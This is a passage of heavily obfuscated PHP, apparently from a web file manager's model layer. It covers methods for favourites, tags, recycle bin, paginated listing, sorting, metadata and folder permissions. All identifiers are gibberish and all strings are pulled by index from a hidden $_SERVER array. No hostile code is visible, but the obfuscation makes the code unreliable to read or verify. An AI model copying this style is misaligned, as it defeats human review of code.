$¿½¡–ış[200]; $ğ¯ô¾£Ÿ[$¿½¡–ış[449]] = $this->typeName($ğ¯ô¾£Ÿ[$¿½¡–ış[449]]); if ($ğ¯ô¾£Ÿ[$¿½¡–ış[448]] != 1) { $ğ¯ô¾£Ÿ[$¿½¡–ış[174]] = $ğ¯ô¾£Ÿ[$¿½¡–ış[450]]; unset($ğ¯ô¾£Ÿ[$¿½¡–ış[450]]); } $ŠÃáƒ“… = $§ƒ¸ª; if (isset($ğ¯ô¾£Ÿ[$¿½¡–ış[451]]) && $ğ¯ô¾£Ÿ[$¿½¡–ış[451]][$¿½¡–ış[452]] == -1) { $ŠÃáƒ“… = $ŞˆÌ¥Œô; } $ğ¯ô¾£Ÿ = array_field_key($ğ¯ô¾£Ÿ, $ŠÃáƒ“…); return $ğ¯ô¾£Ÿ; } public function listUserFav() { $†ó«‹âø =& $_SERVER[¡“ËÌ§œ]; $ò‚³½ÄŸ = Model($†ó«‹âø[453])->listData(); $™ê´Í¥… = array_filter_by_field($ò‚³½ÄŸ, $†ó«‹âø[33], $†ó«‹âø[454]); $™ê´Í¥… = array_to_keyvalue($™ê´Í¥…, $†ó«‹âø[12], $†ó«‹âø[84]); if ($™ê´Í¥…) { $ºâú—ï¡ = $this->listSource(array($†ó«‹âø[455] => array($†ó«‹âø[456], $™ê´Í¥…))); } $ºâú—ï¡ = array_to_keyvalue($ºâú—ï¡[$†ó«‹âø[398]], $†ó«‹âø[440]); foreach ($ò‚³½ÄŸ as &$ø©¼ø Ñ) { $ø©¼ø Ñ = array($†ó«‹âø[457] => $ø©¼ø Ñ[$†ó«‹âø[437]], $†ó«‹âø[458] => $ø©¼ø Ñ[$†ó«‹âø[32]], $†ó«‹âø[459] => $ø©¼ø Ñ[$†ó«‹âø[84]], $†ó«‹âø[460] => $ø©¼ø Ñ[$†ó«‹âø[33]], $†ó«‹âø[461] => $ø©¼ø Ñ[$†ó«‹âø[201]], $†ó«‹âø[462] => $ø©¼ø Ñ[$†ó«‹âø[85]]); if ($ø©¼ø Ñ[$†ó«‹âø[33]] == $†ó«‹âø[454] && $ºâú—ï¡[$ø©¼ø Ñ[$†ó«‹âø[84]]]) { $ø©¼ø Ñ[$†ó«‹âø[87]] = $ºâú—ï¡[$ø©¼ø Ñ[$†ó«‹âø[84]]]; } } unset($ø©¼ø Ñ); return $ò‚³½ÄŸ; } public function listUserTag($Ö­Å¬„à) { $²ØóÌâ =& $_SERVER[¡“ËÌ§œ]; if ($Ö­Å¬„à && !is_array($Ö­Å¬„à)) { $Ö­Å¬„à = array($Ö­Å¬„à); } $İ¢çüÃÒ = Model($²ØóÌâ[463])->listData(); $‡„ÖÌ¡ı = array(); $¢ç¶•¨… = array(); foreach ($İ¢çüÃÒ as $’Ã¹ÇÊ’) { $ÔÌõÊİ¢ = $’Ã¹ÇÊ’[$²ØóÌâ[84]]; if (!$ÔÌõÊİ¢) { continue; } if (!isset($¢ç¶•¨…[$ÔÌõÊİ¢])) { $¢ç¶•¨…[$ÔÌõÊİ¢] = array(); } $¢ç¶•¨…[$ÔÌõÊİ¢][] = $’Ã¹ÇÊ’[$²ØóÌâ[464]]; $‡„ÖÌ¡ı[$’Ã¹ÇÊ’[$²ØóÌâ[84]]] = $’Ã¹ÇÊ’; } $²¤¢È… = array(); $Í×ë¸‘ñ = array(); $˜­ƒ™ç = array(); foreach ($¢ç¶•¨… as $ñ¿ÑÈÔİ => $¹¯ÁË¯ğ) { $­Û€öÇ = !0; if (!$Ö­Å¬„à) { $²¤¢È…[] = $ñ¿ÑÈÔİ; continue; } foreach ($Ö­Å¬„à as $–ˆé†·Ê) { if (!in_array($–ˆé†·Ê, $¹¯ÁË¯ğ)) { $­Û€öÇ = !1; break; } } if (!$­Û€öÇ) { continue; } if (!is_numeric($ñ¿ÑÈÔİ)) { $›ˆÓÅĞˆ = $‡„ÖÌ¡ı[$ñ¿ÑÈÔİ]; $–†¬ó = array($²ØóÌâ[32] => $›ˆÓÅĞˆ[$²ØóÌâ[32]], $²ØóÌâ[84] => $›ˆÓÅĞˆ[$²ØóÌâ[84]], $²ØóÌâ[33] => $›ˆÓÅĞˆ[$²ØóÌâ[33]], $²ØóÌâ[87] => array($²ØóÌâ[465] => 1), $²ØóÌâ[202] => !0); if ($›ˆÓÅĞˆ[$²ØóÌâ[33]] == $²ØóÌâ[200]) { $˜­ƒ™ç[] = $–†¬ó; } if ($›ˆÓÅĞˆ[$²ØóÌâ[33]] == $²ØóÌâ[75]) { $Í×ë¸‘ñ[] = $–†¬ó; } continue; } $²¤¢È…[] = $ñ¿ÑÈÔİ; } if ($²¤¢È…) { $¿ÔøÖ¤¤ = $this->listSource(array($²ØóÌâ[455] => array($²ØóÌâ[456], $²¤¢È…))); } $¿ÔøÖ¤¤ = $¿ÔøÖ¤¤ ? $¿ÔøÖ¤¤ : array($²ØóÌâ[82] => array(), $²ØóÌâ[83] => array()); $¿ÔøÖ¤¤[$²ØóÌâ[82]] = array_merge($¿ÔøÖ¤¤[$²ØóÌâ[82]], $Í×ë¸‘ñ); $¿ÔøÖ¤¤[$²ØóÌâ[83]] = array_merge($¿ÔøÖ¤¤[$²ØóÌâ[83]], $˜­ƒ™ç); if (isset($¿ÔøÖ¤¤[$²ØóÌâ[395]]) && count($²¤¢È…) == $¿ÔøÖ¤¤[$²ØóÌâ[395]][$²ØóÌâ[396]]) { return $¿ÔøÖ¤¤; } $ğÕƒğ = array(); $êèëÁ“ö = array_to_keyvalue($¿ÔøÖ¤¤[$²ØóÌâ[82]], $²ØóÌâ[12], $²ØóÌâ[440]); $±í·È‡Ô = array_to_keyvalue($¿ÔøÖ¤¤[$²ØóÌâ[83]], $²ØóÌâ[12], $²ØóÌâ[440]); $ıóòÚ = array_merge($±í·È‡Ô, $êèëÁ“ö); foreach ($²¤¢È… as $ÔÌõÊİ¢) { if (!in_array($ÔÌõÊİ¢, $ıóòÚ)) { $ğÕƒğ[] = $ÔÌõÊİ¢; } } if ($ğÕƒğ) { Model($²ØóÌâ[466])->removeBySource($ğÕƒğ); } return $¿ÔøÖ¤¤; } public function listUserRecycle() { $‰Íê‹¦œ =& $_SERVER[¡“ËÌ§œ]; $ÊÜò§ = Model($‰Íê‹¦œ[467])->listData(); if (!$ÊÜò§) { return array(); } $Îßİ¤‡ = array($‰Íê‹¦œ[455] => array($‰Íê‹¦œ[456], $ÊÜò§), $‰Íê‹¦œ[468] => 1); return $this->listSource($Îßİ¤‡); } public function listSource($°³Äêß‘, $ååŠş¨é = 3000, $ö‰¬‘çØ = false) { $©‚ÑÊü§ =& $_SERVER[¡“ËÌ§œ]; if (!isset($°³Äêß‘[$©‚ÑÊü§[469]])) { $°³Äêß‘[$©‚ÑÊü§[469]] = 0; } if (isset($°³Äêß‘[$©‚ÑÊü§[470]]) && $°³Äêß‘[$©‚ÑÊü§[470]] == $©‚ÑÊü§[198]) { $°³Äêß‘[$©‚ÑÊü§[450]] = array($©‚ÑÊü§[360], $©‚ÑÊü§[471]); } $ë¿öœö‹ = $©‚ÑÊü§[472]; $©Ãé—•§ = $this->field($ë¿öœö‹)->_makeOrder()->where($°³Äêß‘)->selectPage($ååŠş¨é); $this->_listPageCheck($©Ãé—•§, $ë¿öœö‹, $°³Äêß‘); $this->_listDataApply($©Ãé—•§[$©‚ÑÊü§[398]], $ö‰¬‘çØ); $this->_listMake($©Ãé—•§); return $©Ãé—•§; } private function _listPageCheck(&$ÌáÛœò“, $€ÀÜ’ ¯, $Ï†÷Ä†Š) { $î ¶¼È‰ =& $_SERVER[¡“ËÌ§œ]; if (!is_array($ÌáÛœò“[$î ¶¼È‰[395]])) { return; } $æÅê’£– = $ÌáÛœò“[$î ¶¼È‰[395]]; if ($æÅê’£–[$î ¶¼È‰[397]] <= 1) { return; } if ($æÅê’£–[$î ¶¼È‰[396]] >= 100000) { return; } if (Model($î ¶¼È‰[473])->get($î ¶¼È‰[474]) != $î ¶¼È‰[475]) { return; } $€ÀÜ’ ¯ = str_replace(array($î ¶¼È‰[53], $î ¶¼È‰[371], $î ¶¼È‰[231]), $î ¶¼È‰[12], $€ÀÜ’ ¯); $€ÀÜ’ ¯ = $î ¶¼È‰[476] . str_replace($î ¶¼È‰[50], $î ¶¼È‰[477], $€ÀÜ’ ¯) . $î ¶¼È‰[478]; $¸†ËÊ©… = $î ¶¼È‰[479]; $¸†ËÊ©… = $¸†ËÊ©… . $î ¶¼È‰[480]; $Øâ´°‹ = $æÅê’£–[$î ¶¼È‰[392]] * ($æÅê’£–[$î ¶¼È‰[382]] - 1) . $î ¶¼È‰[50] . $æÅê’£–[$î ¶¼È‰[392]]; $ÂÛÌÁ¹® = $this->_makeOrder(!0); $é£Ü¬¿— = $î ¶¼È‰[476] . str_replace($î ¶¼È‰[50], $î ¶¼È‰[477], $ÂÛÌÁ¹®[0]); if (strpos($é£Ü¬¿—, $î ¶¼È‰[481])) { $é£Ü¬¿— = str_replace($î ¶¼È‰[481], $î ¶¼È‰[482], $é£Ü¬¿—); } else { $é£Ü¬¿— .= $î ¶¼È‰[483] . $ÂÛÌÁ¹®[1]; } $éŒı½’ò = array(); foreach ($Ï†÷Ä†Š as $î‰„´û” => $Ò°¶Â‰³) { $éŒı½’ò[$î ¶¼È‰[476] . $î‰„´û”] = $Ò°¶Â‰³; } $this->alias($î ¶¼È‰[484])->field($€ÀÜ’ ¯)->limit($Øâ´°‹)->order($é£Ü¬¿—); $ÜòÆ…â² = $this->join($¸†ËÊ©…)->where($éŒı½’ò)->select(); if ($ÜòÆ…â²) { $ÌáÛœò“[$î ¶¼È‰[398]] = $ÜòÆ…â²; } } protected function _makeOrder($Îç‡“Ô = false) { $¥ÌÒ·ŞÅ =& $_SERVER[¡“ËÌ§œ]; $¢Î•öÃ = Model($¥ÌÒ·ŞÅ[485])->get($¥ÌÒ·ŞÅ[486]); $ÙæĞƒÏ˜ = Model($¥ÌÒ·ŞÅ[485])->get($¥ÌÒ·ŞÅ[487]); $¡—é¦‰˜ = array($¥ÌÒ·ŞÅ[488] => $¥ÌÒ·ŞÅ[489], $¥ÌÒ·ŞÅ[490] => $¥ÌÒ·ŞÅ[491]); $¨¨öÉ¸å = array($¥ÌÒ·ŞÅ[32] => $¥ÌÒ·ŞÅ[32], $¥ÌÒ·ŞÅ[76] => $¥ÌÒ·ŞÅ[76], $¥ÌÒ·ŞÅ[174] => $¥ÌÒ·ŞÅ[450], $¥ÌÒ·ŞÅ[492] => $¥ÌÒ·ŞÅ[492], $¥ÌÒ·ŞÅ[493] => $¥ÌÒ·ŞÅ[494], $¥ÌÒ·ŞÅ[201] => $¥ÌÒ·ŞÅ[201], $¥ÌÒ·ŞÅ[85] => $¥ÌÒ·ŞÅ[85]); $Ï«–™‹õ = Input::get($¥ÌÒ·ŞÅ[495], $¥ÌÒ·ŞÅ[7], $¢Î•öÃ, array_keys($¨¨öÉ¸å)); $ ¼³šş = Input::get($¥ÌÒ·ŞÅ[496], $¥ÌÒ·ŞÅ[7], $ÙæĞƒÏ˜, array_keys($¡—é¦‰˜)); if (!in_array($Ï«–™‹õ, array_keys($¨¨öÉ¸å))) { $Ï«–™‹õ = $¥ÌÒ·ŞÅ[32]; } if (!in_array($ ¼³šş, array_keys($¡—é¦‰˜))) { $Ï«–™‹õ = $¥ÌÒ·ŞÅ[488]; } if ($Ï«–™‹õ == $¥ÌÒ·ŞÅ[32]) { } $èßÎú„ = $¥ÌÒ·ŞÅ[497] . $¨¨öÉ¸å[$Ï«–™‹õ] . $¥ÌÒ·ŞÅ[53] . $¡—é¦‰˜[$ ¼³šş]; $èßÎú„ = rtrim(trim($èßÎú„), $¥ÌÒ·ŞÅ[50]); if ($Îç‡“Ô) { return array($èßÎú„, $¡—é¦‰˜[$ ¼³šş]); } return $this->order($èßÎú„); } protected function _listDataApplyItem($Š¼õæ¯º, $ÖØ À‡ = false) { $‰¨«Ìù’ = array($Š¼õæ¯º); $this->_listDataApply($‰¨«Ìù’, $ÖØ À‡); return $‰¨«Ìù’[0]; } protected function _listDataApply(&$ƒŞ—Æ¸Ğ, $öÃÚËÅ = false) { $ÅÚÃâ‡¯ =& $_SERVER[¡“ËÌ§œ]; if (!$ƒŞ—Æ¸Ğ) { $ƒŞ—Æ¸Ğ = array(); return; } $á‘ş©Æø = array_to_keyvalue($ƒŞ—Æ¸Ğ, $ÅÚÃâ‡¯[12], $ÅÚÃâ‡¯[440]); $á‘ş©Æø = array_unique($á‘ş©Æø); $this->_listSourceCache($ƒŞ—Æ¸Ğ); if (!$öÃÚËÅ) { $this->_listAppendMeta($ƒŞ—Æ¸Ğ, $á‘ş©Æø); $this->_listAppendFileMeta($ƒŞ—Æ¸Ğ, $á‘ş©Æø); $this->_listAppendChildren($ƒŞ—Æ¸Ğ, $á‘ş©Æø); } $this->_listAppendPath($ƒŞ—Æ¸Ğ); $this->_listAppendAuth($ƒŞ—Æ¸Ğ); $this->_listAppendSourceInfo($ƒŞ—Æ¸Ğ, $á‘ş©Æø); $this->_listAppendUser($ƒŞ—Æ¸Ğ); $this->_listFilterInfo($ƒŞ—Æ¸Ğ, $öÃÚËÅ); $this->_listAppendAuthSecret($ƒŞ—Æ¸Ğ); } protected function _listSourceCache($¹ıø×ä) { $¦Ğ­‰¶º =& $_SERVER[¡“ËÌ§œ]; foreach ($¹ıø×ä as $Ò‚ª³üä) { self::$cacheSourceInfo[$¦Ğ­‰¶º[498] . $Ò‚ª³üä[$¦Ğ­‰¶º[440]]] = $Ò‚ª³üä; } } protected function _listFilterInfo(&$¯ÎàÏØì, $„Ø£Òæ = false) { $ÊÌÜ°Ëï =& $_SERVER[¡“ËÌ§œ]; foreach ($¯ÎàÏØì as &$ãŸ³º“È) { $ãŸ³º“È = $this->pathInfoFilter($ãŸ³º“È); self::$cachePathInfo[$ÊÌÜ°Ëï[499] . intval($„Ø£Òæ) . $ÊÌÜ°Ëï[415] . $ãŸ³º“È[$ÊÌÜ°Ëï[440]]] = $ãŸ³º“È; } unset($ãŸ³º“È); } protected function _listMake(&$¨ïïÏØ—) { $™¯‹íÏ =& $_SERVER[¡“ËÌ§œ]; $¨ïïÏØ—[$™¯‹íÏ[82]] = array(); $¨ïïÏØ—[$™¯‹íÏ[83]] = array(); foreach ($¨ïïÏØ—[$™¯‹íÏ[398]] as $§… ‰«ğ) { $¢ÎŒÀÇ¿ = $§… ‰«ğ[$™¯‹íÏ[448]] == 1 ? $™¯‹íÏ[82] : $™¯‹íÏ[83]; $¨ïïÏØ—[$¢ÎŒÀÇ¿][] = $§… ‰«ğ; } unset($¨ïïÏØ—[$™¯‹íÏ[398]]); } protected function _listAppendMeta(&$Áµ€¹¸, $òšá¦ÊÄ) { $‹–¢à‡ã =& $_SERVER[¡“ËÌ§œ]; $Îæ¸£ğ¢ = array($‹–¢à‡ã[455] => array($‹–¢à‡ã[456], $òšá¦ÊÄ)); $Ó¼´èíè = Model($‹–¢à‡ã[500])->field($‹–¢à‡ã[501])->where($Îæ¸£ğ¢)->select(); if (!$Ó¼´èíè) { return; } $å²èàĞÓ = array($‹–¢à‡ã[502], $‹–¢à‡ã[503], $‹–¢à‡ã[482]); $ìœ–èì = array(); foreach ($Ó¼´èíè as $´íŠÊ§) { if (!isset($ìœ–èì[$´íŠÊ§[$‹–¢à‡ã[440]]])) { $ìœ–èì[$´íŠÊ§[$‹–¢à‡ã[440]]] = array(); } if (in_array($´íŠÊ§[$‹–¢à‡ã[94]], $å²èàĞÓ)) { continue; } $ìœ–èì[$´íŠÊ§[$‹–¢à‡ã[440]]][$´íŠÊ§[$‹–¢à‡ã[94]]] = $´íŠÊ§[$‹–¢à‡ã[403]]; } foreach ($Áµ€¹¸ as &$Ğ¤æ—ˆ­) { $Ğ¤æ—ˆ­[$‹–¢à‡ã[504]] = !1; if (isset($ìœ–èì[$Ğ¤æ—ˆ­[$‹–¢à‡ã[440]]])) { $Ğ¤æ—ˆ­[$‹–¢à‡ã[504]] = $ìœ–èì[$Ğ¤æ—ˆ­[$‹–¢à‡ã[440]]]; } if ($this->fileIsLock($Ğ¤æ—ˆ­) && $Ğ¤æ—ˆ­[$‹–¢à‡ã[451]]) { $ÎÀ¢’ï÷ = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $Ğ¤æ—ˆ­[$‹–¢à‡ã[451]][$‹–¢à‡ã[452]] = AuthModel::authDisable($Ğ¤æ—ˆ­[$‹–¢à‡ã[451]][$‹–¢à‡ã[452]], $ÎÀ¢’ï÷); $Ğ¤æ—ˆ­[$‹–¢à‡ã[451]][$‹–¢à‡ã[505]][$‹–¢à‡ã[451]] = $Ğ¤æ—ˆ­[$‹–¢à‡ã[451]][$‹–¢à‡ã[452]]; } } unset($Ğ¤æ—ˆ­); } protected function _listAppendFileMeta(&$‘¾¡ŸíÒ, $à¼àÀ¼) { $›½†›ŸÛ =& $_SERVER[¡“ËÌ§œ]; $˜õæ¶´µ = array_to_keyvalue($‘¾¡ŸíÒ, $›½†›ŸÛ[12], $›½†›ŸÛ[506]); $˜õæ¶´µ = array_filter(array_unique($˜õæ¶´µ)); if (!$˜õæ¶´µ) { return; } $¹¨È‹¥ = array($›½†›ŸÛ[507] => array($›½†›ŸÛ[456], $˜õæ¶´µ)); $õÌ†‘ƒ = $›½†›ŸÛ[508]; $Å§Õóıî = Model($›½†›ŸÛ[509])->field($õÌ†‘ƒ)->where($¹¨È‹¥)->select(); $Å§Õóıî = array_to_keyvalue($Å§Õóıî, $›½†›ŸÛ[506]); $ú„çÄˆ = Model($›½†›ŸÛ[510])->field($›½†›ŸÛ[511])->where($¹¨È‹¥)->select(); $ú„çÄˆ = $ú„çÄˆ ? $ú„çÄˆ : array(); $³˜­êæ¾ = array(); foreach ($ú„çÄˆ as $± é£ô) { if (!isset($³˜­êæ¾[$± é£ô[$›½†›ŸÛ[506]]])) { $³˜­êæ¾[$± é£ô[$›½†›ŸÛ[506]]] = array(); } $³˜­êæ¾[$± é£ô[$›½†›ŸÛ[506]]][$± é£ô[$›½†›ŸÛ[94]]] = $± é£ô[$›½†›ŸÛ[403]]; } foreach ($‘¾¡ŸíÒ as &$ÜğŞÙ¼€) { $‰ÏÙ‘Ş— = $ÜğŞÙ¼€[$›½†›ŸÛ[506]]; if (!$‰ÏÙ‘Ş— || !is_array($Å§Õóıî[$‰ÏÙ‘Ş—])) { continue; } $ë˜›˜šå = $Å§Õóıî[$‰ÏÙ‘Ş—]; $ë˜›˜šå[$›½†›ŸÛ[76]] = $ÜğŞÙ¼€[$›½†›ŸÛ[76]]; $ë˜›˜šå[$›½†›ŸÛ[32]] = $ÜğŞÙ¼€[$›½†›ŸÛ[32]]; if (!isset(self::$cacheFileInfo[$›½†›ŸÛ[512] . $‰ÏÙ‘Ş—])) { self::$cacheFileInfo[$›½†›ŸÛ[512] . $‰ÏÙ‘Ş—] = array_merge(array(), $ë˜›˜šå); } unset($Å§Õóıî[$‰ÏÙ‘Ş—][$›½†›ŸÛ[84]]); $œà·Œ® = is_array($³˜­êæ¾[$‰ÏÙ‘Ş—]) ? $³˜­êæ¾[$‰ÏÙ‘Ş—] : array(); $ÜğŞÙ¼€[$›½†›ŸÛ[170]] = array_merge($œà·Œ®, $Å§Õóıî[$‰ÏÙ‘Ş—]); if (isset($ÜğŞÙ¼€[$›½†›ŸÛ[170]][$›½†›ŸÛ[169]])) { $ÜğŞÙ¼€[$›½†›ŸÛ[169]] = json_decode($ÜğŞÙ¼€[$›½†›ŸÛ[170]][$›½†›ŸÛ[169]], !0); unset($ÜğŞÙ¼€[$›½†›ŸÛ[170]][$›½†›ŸÛ[169]]); } } unset($ÜğŞÙ¼€); } protected function _listAppendSourceInfo(&$€Á¸¯ÎŠ, $òƒşâ¹í) { $¤Ï­Ùıå =& $_SERVER[¡“ËÌ§œ]; $õÄ€ü«¡ = Model($¤Ï­Ùıå[513])->listData(); $êİ­‹Ï† = Model($¤Ï­Ùıå[463])->listData(); $¯õÇÃùÖ = Model($¤Ï­Ùıå[453])->listData(); $¥­”†ş¬ = Model($¤Ï­Ùıå[514])->listSimple(); $â¬±£©ï = array_to_keyvalue($õÄ€ü«¡, $¤Ï­Ùıå[437]); $‡§ÌÆÑØ = array_to_keyvalue_group($êİ­‹Ï†, $¤Ï­Ùıå[84], $¤Ï­Ùıå[464]); $¯í¢è” = array_to_keyvalue($¯õÇÃùÖ, $¤Ï­Ùıå[84]); $òˆ¿®ï„ = array_to_keyvalue_group($¥­”†ş¬, $¤Ï­Ùıå[440]); foreach ($€Á¸¯ÎŠ as &$“©‡Öš) { $“©‡Öš[$¤Ï­Ùıå[87]] = array($¤Ï­Ùıå[515] => 0, $¤Ï­Ùıå[516] => 0, $¤Ï­Ùıå[517] => 0); if (isset($¯í¢è”[$“©‡Öš[$¤Ï­Ùıå[440]]])) { $“©‡Öš[$¤Ï­Ùıå[87]][$¤Ï­Ùıå[518]] = 1; $“©‡Öš[$¤Ï­Ùıå[87]][$¤Ï­Ùıå[519]] = $¯í¢è”[$“©‡Öš[$¤Ï­Ùıå[440]]][$¤Ï­Ùıå[32]]; } if ($‡§ÌÆÑØ && $â¬±£©ï && isset($‡§ÌÆÑØ[$“©‡Öš[$¤Ï­Ùıå[440]]])) { $“©‡Öš[$¤Ï­Ùıå[87]][$¤Ï­Ùıå[520]] = array(); foreach ($‡§ÌÆÑØ[$“©‡Öš[$¤Ï­Ùıå[440]]] as $Å›ü¥ü) { $Úà€š = $â¬±£©ï[$Å›ü¥ü]; $“©‡Öš[$¤Ï­Ùıå[87]][$¤Ï­Ùıå[520]][] = array($¤Ï­Ùıå[521] => $Úà€š[$¤Ï­Ùıå[437]], $¤Ï­Ùıå[458] => $Úà€š[$¤Ï­Ùıå[32]], $¤Ï­Ùıå[522] => $Úà€š[$¤Ï­Ùıå[523]]); } } if ($òˆ¿®ï„ && isset($òˆ¿®ï„[$“©‡Öš[$¤Ï­Ùıå[440]]])) { $“©‡Öš[$¤Ï­Ùıå[87]][$¤Ï­Ùıå[524]] = array(); foreach ($òˆ¿®ï„[$“©‡Öš[$¤Ï­Ùıå[440]]] as $ƒÍùÆòÁ) { $àÌû½¬÷ = $¤Ï­Ùıå[525]; if ($ƒÍùÆòÁ[$¤Ï­Ùıå[526]] == $¤Ï­Ùıå[88]) { $àÌû½¬÷ .= $¤Ï­Ùıå[527]; } $“©‡Öš[$¤Ï­Ùıå[87]][$¤Ï­Ùıå[524]] = array_field_key($ƒÍùÆòÁ, explode($¤Ï­Ùıå[50], $àÌû½¬÷)); } } } unset($“©‡Öš); return $€Á¸¯ÎŠ; } protected function _listAppendChildren(&$ãíßåŸ, $ÁûşõÊ) { $¢ëş¨ÊŸ =& $_SERVER[¡“ËÌ§œ]; $«»ÀˆÇæ = array(); $¶ù¢îø“ = array($¢ëş¨ÊŸ[207] => 0, $¢ëş¨ÊŸ[208] => 0); foreach ($ãíßåŸ as &$³üŞ†ÈÇ) { if (!$³üŞ†ÈÇ[$¢ëş¨ÊŸ[448]]) { continue; } $«»ÀˆÇæ[] = $³üŞ†ÈÇ[$¢ëş¨ÊŸ[440]]; } unset($³üŞ†ÈÇ); if (!$«»ÀˆÇæ) { return; } $¥îÀ¤µÀ = array($¢ëş¨ÊŸ[470] => array($¢ëş¨ÊŸ[7], $«»ÀˆÇæ), $¢ëş¨ÊŸ[469] => 0); $¦Å»ª› = array($¢ëş¨ÊŸ[470], $¢ëş¨ÊŸ[448], $¢ëş¨ÊŸ[528] => $¢ëş¨ÊŸ[529]); $¢Á³²ó© = $this->field($¦Å»ª›)->where($¥îÀ¤µÀ)->group($¢ëş¨ÊŸ[530])->select(); $¡Ô´å— = array(); foreach ($¢Á³²ó© as $ëœú´é¥) { $ÀàÑÖ¨¹ = $ëœú´é¥[$¢ëş¨ÊŸ[470]]; $ğõ›€ Ó = $ëœú´é¥[$¢ëş¨ÊŸ[448]] == $¢ëş¨ÊŸ[88] ? $¢ëş¨ÊŸ[208] : $¢ëş¨ÊŸ[207]; if (!isset($¡Ô´å—[$ÀàÑÖ¨¹])) { $¡Ô´å—[$ÀàÑÖ¨¹] = array($¢ëş¨ÊŸ[207] => 0, $¢ëş¨ÊŸ[208] => 0); } $¡Ô´å—[$ÀàÑÖ¨¹][$ğõ›€ Ó] += $ëœú´é¥[$¢ëş¨ÊŸ[529]]; } foreach ($ãíßåŸ as &$³üŞ†ÈÇ) { if (!$³üŞ†ÈÇ[$¢ëş¨ÊŸ[448]]) { continue; } $ìº‚Ğî‘ = is_array($¡Ô´å—[$³üŞ†ÈÇ[$¢ëş¨ÊŸ[440]]]) ? $¡Ô´å—[$³üŞ†ÈÇ[$¢ëş¨ÊŸ[440]]] : $¶ù¢îø“; $³üŞ†ÈÇ[$¢ëş¨ÊŸ[208]] = $ìº‚Ğî‘[$¢ëş¨ÊŸ[208]]; $³üŞ†ÈÇ[$¢ëş¨ÊŸ[207]] = $ìº‚Ğî‘[$¢ëş¨ÊŸ[207]]; unset($³üŞ†ÈÇ[$¢ëş¨ÊŸ[450]]); } unset($³üŞ†ÈÇ); } protected function _listAppendAuth(&$íÀ”÷İ) { $Ø½ããùï =& $_SERVER[¡“ËÌ§œ]; $æíö¤˜ = array(); foreach ($íÀ”÷İ as $ŸÇûÔÚÛ) { if ($ŸÇûÔÚÛ[$Ø½ããùï[449]] == self::TYPE_GROUP) { $æíö¤˜[] = $ŸÇûÔÚÛ[$Ø½ããùï[440]]; } } if (!$æíö¤˜) { return; } $Ø›¯ö¯Â = array_to_keyvalue($íÀ”÷İ, $Ø½ããùï[440]); $Õœ÷òß = Model($Ø½ããùï[531])->getSourceList($æíö¤˜, $Ø›¯ö¯Â); $˜£¯Ôâû = $GLOBALS[$Ø½ããùï[532]] == 1; foreach ($íÀ”÷İ as $¾úü­£Ø => &$ŸÇûÔÚÛ) { $ŸÇûÔÚÛ[$Ø½ããùï[451]] = $Õœ÷òß[$ŸÇûÔÚÛ[$Ø½ããùï[440]]]; if (!$ŸÇûÔÚÛ[$Ø½ããùï[451]] && $ŸÇûÔÚÛ[$Ø½ããùï[449]] == self::TYPE_GROUP) { $ŸÇûÔÚÛ[$Ø½ããùï[451]] = Action($Ø½ããùï[533])->pathGroupAuthMake($ŸÇûÔÚÛ[$Ø½ããùï[534]]); if (!$ŸÇûÔÚÛ[$Ø½ããùï[451]] && !$˜£¯Ôâû) { $ŸÇûÔÚÛ[$Ø½ããùï[203]] = !1; $ŸÇûÔÚÛ[$Ø½ããùï[202]] = !1; } } if ($ŸÇûÔÚÛ[$Ø½ããùï[451]]) { $ŸÇûÔÚÛ[$Ø½ããùï[203]] = AuthModel::authCheckEdit($ŸÇûÔÚÛ[$Ø½ããùï[451]][$Ø½ããùï[452]]); $ŸÇûÔÚÛ[$Ø½ããùï[202]] = AuthModel::authCheckView($ŸÇûÔÚÛ[$Ø½ããùï[451]][$Ø½ããùï[452]]); } $this->groupPathDisplay($ŸÇûÔÚÛ); } unset($ŸÇûÔÚÛ); } public function _listAppendAuthSecret(&$‹ø —­) { $¥İãÄÊ« =& $_SERVER[¡“ËÌ§œ]; if (Model($¥İãÄÊ«[473])->get($¥İãÄÊ«[535]) != $¥İãÄÊ«[88]) { return; } static $ ú Ÿ·Ç = false; if (!$ ú Ÿ·Ç) { $º­‡‹Õ = Model($¥İãÄÊ«[536]); $¼ôøŒ¼â = Model($¥İãÄÊ«[537]); $ ú Ÿ·Ç = $¼ôøŒ¼â->listData(); $ ú Ÿ·Ç = array_to_keyvalue($ ú Ÿ·Ç, $¥İãÄÊ«[440]); $ıÁç´Àï = json_decode(Model($¥İãÄÊ«[473])->get($¥İãÄÊ«[538]), !0); $ıÁç´Àï = array_to_keyvalue($ıÁç´Àï, $¥İãÄÊ«[437]); foreach ($ ú Ÿ·Ç as $ÏâÄÙÈ => $£İšŠ…®) { $è±ÚŸœ = $ıÁç´Àï[$£İšŠ…®[$¥İãÄÊ«[539]]]; if (!$è±ÚŸœ) { $¼ôøŒ¼â->remove($£İšŠ…®[$¥İãÄÊ«[437]]); unset($ ú Ÿ·Ç[$ÏâÄÙÈ]); continue; } $¢Ë‰¼¡ª = $º­‡‹Õ->listData($è±ÚŸœ[$¥İãÄÊ«[451]]); if (!$¢Ë‰¼¡ª) { $¼ôøŒ¼â->remove($£İšŠ…®[$¥İãÄÊ«[437]]); unset($ ú Ÿ·Ç[$ÏâÄÙÈ]); continue; } $£İšŠ…®[$¥İãÄÊ«[451]] = $¢Ë‰¼¡ª; $£İšŠ…®[$¥İãÄÊ«[540]] = $è±ÚŸœ; $£İšŠ…®[$¥İãÄÊ«[541]] = Model($¥İãÄÊ«[542])->getInfoSimpleOuter($£İšŠ…®[$¥İãÄÊ«[492]]); $ ú Ÿ·Ç[$ÏâÄÙÈ] = $£İšŠ…®; } } $²»î©å = USER_ID; $ÕêÊéõÑ = array(); $¬ñ­øÎ¼ = $this->_listAppendPath($ÕêÊéõÑ, !0); foreach ($‹ø —­ as $ÏâÄÙÈ => &$£İšŠ…®) { if (!is_array($£İšŠ…®[$¥İãÄÊ«[451]])) { continue; } if ($£İšŠ…®[$¥İãÄÊ«[449]] != $¥İãÄÊ«[543]) { continue; } if (isset($ ú Ÿ·Ç[$£İšŠ…®[$¥İãÄÊ«[440]]])) { $˜šÛÚš = $ ú Ÿ·Ç[$£İšŠ…®[$¥İãÄÊ«[440]]]; if (!is_array($£İšŠ…®[$¥İãÄÊ«[504]])) { $£İšŠ…®[$¥İãÄÊ«[504]] = array(); } $£İšŠ…®[$¥İãÄÊ«[504]][$¥İãÄÊ«[544]] = $˜šÛÚš[$¥İãÄÊ«[539]]; $£İšŠ…®[$¥İãÄÊ«[451]][$¥İãÄÊ«[545]] = $˜šÛÚš; 